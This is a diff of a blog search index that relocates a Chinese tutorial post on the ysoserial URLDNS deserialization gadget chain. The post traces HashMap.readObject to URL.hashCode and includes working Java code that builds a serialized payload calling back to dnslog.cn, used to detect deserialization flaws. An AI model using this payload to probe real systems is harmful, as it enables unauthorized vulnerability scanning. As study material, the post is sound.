@@ -567,98 +567,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java ysoserial学习之URLDNS(一)</title>
-    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
-    <content><![CDATA[<blockquote>
-<p>  雄关漫道真如铁 而今迈步从头越</p>
-</blockquote>
-<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><strong>URLDNS</strong> 是 ysoserial 中利用链的一个 payload，该 payload 的目的只有一个，就是确定目标系统上是否存在可控的 <code>readObject()</code> 方法，即是否存在Java 反序列化漏洞。该利用链具有如下特点:</p>
-<ul>
-<li>不限制jdk版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li>
-<li>只对指定的 URL 发送 DNS 查询，不做其他操作</li>
-<li>在⽬目标没有回显的时候，能够通过DNS请求得知是否存在反序列列化漏洞</li>
-</ul>
-<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p><code>java.util.HashMap</code> 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求。</p>
-<p>我们从 <strong>ysoserial</strong> 项目<code>src/main/java/ysoserial/payloads/URLDNS.java</code> 的注释中可以看到 <strong>URLDNS</strong>的调用链（Gadget Chain):</p>
-<blockquote>
-<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
-</blockquote>
-<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
-<p>HashMap: java中的一种容器，用来存储内容，内容以键值对的形式存放。</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
-<p>先来看看 HashMap 自己实现的 readObject() 函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
-<p>这里通过一个 for 循环将 HashMap 中存储的key通过 <code>K key = (K) s.readObject();</code> <strong>反序列化后</strong>，调用 <strong>putVal</strong>和<strong>hash</strong>函数，也就是前面提到的Gadget Chain中的中间两个调用链，再来看看，<strong>hash</strong>这个函数的实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
-<p>调用了参数 key 的 <strong>hashCode</strong> 函数，而我们从<code>src/main/java/ysoserial/payloads/URLDNS.java</code>中可以得知这个key就是一个URL对象。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
-<p>接下来再看看 java 的基本类 URL 中关于 <strong>HashCode</strong> 的实现</p>
-<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>我们来自己调用 URL 的 <code>hashCode</code> 函数来看看效果</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
-<p>可以得知<code>hashCode</code>触发了一次DNS请求，使用 Ctrl+右键 点进去看看该函数的具体实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
-<p>这里注意一下 <strong>handler</strong> 是一个 <strong>transient</strong>  关键字修饰的变量，不参与序列化。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
-<p>经过Debug跟踪发现会在 HashMap#readObject 的 <code>K key = (K) s.readObject();</code> 这行进入URL#readObject 的<code>getURLStreamHandler</code> 函数进行 handler 的赋值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
-<p>hashCode 的默认值为-1, 然后接下来进入 <code>hashCode = handler.hashCode(this);</code>, 可以看到调用了<code>getHostAddress</code>函数，这个函数就是用来 DNS 解析，返回对应 IP 的。</p>
-<blockquote>
-<p>  URL 类将在比较时，如果两个主机名都可以解析为相同的 IP 地址，则认为两个主机是等效的；</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
-<h3 id="2-3-put-触发"><a href="#2-3-put-触发" class="headerlink" title="2.3 put 触发"></a>2.3 put 触发</h3><p>ysoserial这里明确说了 put 函数来触发，通过使用 URL 对象来作为 key 就可以触发一次DNS请求。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
-<p>动手实验一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
-<p>而put为什么会触发，看下put函数的实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
-<p>也是调用了hash(key) –&gt; key.hashCode() 跟之前一样，所以会在put进一个key为URL对象时，会进行一次DNS解析。</p>
-<h3 id="2-4-反序列化"><a href="#2-4-反序列化" class="headerlink" title="2.4 反序列化"></a>2.4 反序列化</h3><p>到了这里有什么用呢？迷了，明明是put时会进行一次DNS解析，看上去并没有和反序列化有什么关联。接下来该干嘛，网上其他文章直接结论了，而像我这种菜鸡，到这一步，完全没搞懂之后应该干啥，怎么把前面说的给串联起来。</p>
-<p>在看鸿蒙发布会时，终于想明白了，现在我们知道当 HashMap 传入一个URL对象时，会进行一次DNS解析，并且HashMap 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>，也就是说当一个Java应用存在反序列化漏洞时，我们可以通过传入一个序列化后的HashMap数据(将URL对象作为key放入HashMap)，当我们传入的数据到达该Java应用的反序列化漏洞点时,这时程序就会调用 HashMap 重写的<strong>readObject</strong> 函数来反序列化读取数据，也就是上述分析过程，然后就会触发 key.hashCode() 函数，进行一次DNS解析。</p>
-<h3 id="2-5-至善至美"><a href="#2-5-至善至美" class="headerlink" title="2.5 至善至美"></a>2.5 至善至美</h3><p>到上面已经可以作为漏洞探测了，但是 ysoserial 项目中有其他代码，我们可以看看具体是什么情况</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
-<p>这里通过继承 <code>URLStreamHandler</code> 类，重写了<code>openConnection</code> 和 <code>getHostAddress</code> 函数，然后</p>
-<p>将handler在创建URL时传入，其实这个传入的handler就是hashCode函数中的handler</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
-<p>前面提到过，HashMap#put 时也会调用 <strong>getHostAddress</strong> 函数进行一次DNS解析，这里就是通过重写的 <strong>getHostAddress</strong> 函数覆盖掉原来的函数，不进行DNS解析，防止在payload创建期间进行DNS解析，也就是一个防干扰功能。</p>
-<p>接下来看看 **Reflections.setFieldValue(u, “hashCode”, -1); <strong>这一行代码。Reflections</strong>类是 ysoserial 写的一个反射类<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>，这是 <code>setFieldValue</code>函数</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>之前在前置知识 <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">初探Java反序列化漏洞(二)</a>中讲到过反射, 上述代码就是通过反射来设置 URL 类的 hashCode的值为-1，这是因为在 HashMap#put 时，已经调用过一次hashCode() 函数，这时 hashCode的值就会改变，不再为-1，让其进行下一步执行DNS解析。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
-<p>那也就是说在下一步经过HashMap的<strong>readObject</strong>函数反序列化时, 因为此时 <code>hashCode != -1</code> ,会直接返回hashCode的值，不再进行调用 handler.hashCode(this) 。因此使用 <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> 反射将 <strong>hashCode</strong>的值设为 <strong>-1</strong>。</p>
-<p>之后通过<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> 执行序列化操作</p>
-<h2 id="0x03-代码模拟"><a href="#0x03-代码模拟" class="headerlink" title="0x03 代码模拟"></a>0x03 代码模拟</h2><p>我们来手动复原一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 put 时不发起 dns 解析</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射将put之后 hashCode 的 值重新赋值为 -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过序列化，发现确实没有在payload生成阶段发起dns解析。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
-<p>接下来我们通过读取<code>out.bin</code> 文件将其反序列化来模拟漏洞点，</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">请求成功。</p>
-<p>最后回顾一下整个流程:			</p>
-<pre><code>1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器
-2. 如果目标机器存在反序列化漏洞，那么会执行`HashMap.readObject()` 将数据反序列化
-3. 在反序列化期间，为了还原hashmap的内容，会调用 `hash()` 方法，而`hash()`函数会调用传入参数的 `hashCode()`方法
-4. 当URL 对象的 `hashCode`属性值为 `-1` 时会调用 `handler.hashCode()`方法，而这个方法会进行一次DNS查询。
-</code></pre>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java反序列化漏洞分析(一)-Shiro550</title>
     <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
     <content><![CDATA[<blockquote>
@@ -808,6 +716,98 @@
       </tags>
   </entry>
   <entry>
+    <title>Java ysoserial学习之URLDNS(一)</title>
+    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
+    <content><![CDATA[<blockquote>
+<p>  雄关漫道真如铁 而今迈步从头越</p>
+</blockquote>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><strong>URLDNS</strong> 是 ysoserial 中利用链的一个 payload，该 payload 的目的只有一个，就是确定目标系统上是否存在可控的 <code>readObject()</code> 方法，即是否存在Java 反序列化漏洞。该利用链具有如下特点:</p>
+<ul>
+<li>不限制jdk版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li>
+<li>只对指定的 URL 发送 DNS 查询，不做其他操作</li>
+<li>在⽬目标没有回显的时候，能够通过DNS请求得知是否存在反序列列化漏洞</li>
+</ul>
+<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p><code>java.util.HashMap</code> 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求。</p>
+<p>我们从 <strong>ysoserial</strong> 项目<code>src/main/java/ysoserial/payloads/URLDNS.java</code> 的注释中可以看到 <strong>URLDNS</strong>的调用链（Gadget Chain):</p>
+<blockquote>
+<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
+</blockquote>
+<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
+<p>HashMap: java中的一种容器，用来存储内容，内容以键值对的形式存放。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
+<p>先来看看 HashMap 自己实现的 readObject() 函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
+<p>这里通过一个 for 循环将 HashMap 中存储的key通过 <code>K key = (K) s.readObject();</code> <strong>反序列化后</strong>，调用 <strong>putVal</strong>和<strong>hash</strong>函数，也就是前面提到的Gadget Chain中的中间两个调用链，再来看看，<strong>hash</strong>这个函数的实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
+<p>调用了参数 key 的 <strong>hashCode</strong> 函数，而我们从<code>src/main/java/ysoserial/payloads/URLDNS.java</code>中可以得知这个key就是一个URL对象。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
+<p>接下来再看看 java 的基本类 URL 中关于 <strong>HashCode</strong> 的实现</p>
+<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>我们来自己调用 URL 的 <code>hashCode</code> 函数来看看效果</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
+<p>可以得知<code>hashCode</code>触发了一次DNS请求，使用 Ctrl+右键 点进去看看该函数的具体实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
+<p>这里注意一下 <strong>handler</strong> 是一个 <strong>transient</strong>  关键字修饰的变量，不参与序列化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
+<p>经过Debug跟踪发现会在 HashMap#readObject 的 <code>K key = (K) s.readObject();</code> 这行进入URL#readObject 的<code>getURLStreamHandler</code> 函数进行 handler 的赋值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
+<p>hashCode 的默认值为-1, 然后接下来进入 <code>hashCode = handler.hashCode(this);</code>, 可以看到调用了<code>getHostAddress</code>函数，这个函数就是用来 DNS 解析，返回对应 IP 的。</p>
+<blockquote>
+<p>  URL 类将在比较时，如果两个主机名都可以解析为相同的 IP 地址，则认为两个主机是等效的；</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
+<h3 id="2-3-put-触发"><a href="#2-3-put-触发" class="headerlink" title="2.3 put 触发"></a>2.3 put 触发</h3><p>ysoserial这里明确说了 put 函数来触发，通过使用 URL 对象来作为 key 就可以触发一次DNS请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
+<p>动手实验一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
+<p>而put为什么会触发，看下put函数的实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
+<p>也是调用了hash(key) –&gt; key.hashCode() 跟之前一样，所以会在put进一个key为URL对象时，会进行一次DNS解析。</p>
+<h3 id="2-4-反序列化"><a href="#2-4-反序列化" class="headerlink" title="2.4 反序列化"></a>2.4 反序列化</h3><p>到了这里有什么用呢？迷了，明明是put时会进行一次DNS解析，看上去并没有和反序列化有什么关联。接下来该干嘛，网上其他文章直接结论了，而像我这种菜鸡，到这一步，完全没搞懂之后应该干啥，怎么把前面说的给串联起来。</p>
+<p>在看鸿蒙发布会时，终于想明白了，现在我们知道当 HashMap 传入一个URL对象时，会进行一次DNS解析，并且HashMap 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>，也就是说当一个Java应用存在反序列化漏洞时，我们可以通过传入一个序列化后的HashMap数据(将URL对象作为key放入HashMap)，当我们传入的数据到达该Java应用的反序列化漏洞点时,这时程序就会调用 HashMap 重写的<strong>readObject</strong> 函数来反序列化读取数据，也就是上述分析过程，然后就会触发 key.hashCode() 函数，进行一次DNS解析。</p>
+<h3 id="2-5-至善至美"><a href="#2-5-至善至美" class="headerlink" title="2.5 至善至美"></a>2.5 至善至美</h3><p>到上面已经可以作为漏洞探测了，但是 ysoserial 项目中有其他代码，我们可以看看具体是什么情况</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
+<p>这里通过继承 <code>URLStreamHandler</code> 类，重写了<code>openConnection</code> 和 <code>getHostAddress</code> 函数，然后</p>
+<p>将handler在创建URL时传入，其实这个传入的handler就是hashCode函数中的handler</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
+<p>前面提到过，HashMap#put 时也会调用 <strong>getHostAddress</strong> 函数进行一次DNS解析，这里就是通过重写的 <strong>getHostAddress</strong> 函数覆盖掉原来的函数，不进行DNS解析，防止在payload创建期间进行DNS解析，也就是一个防干扰功能。</p>
+<p>接下来看看 **Reflections.setFieldValue(u, “hashCode”, -1); <strong>这一行代码。Reflections</strong>类是 ysoserial 写的一个反射类<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>，这是 <code>setFieldValue</code>函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
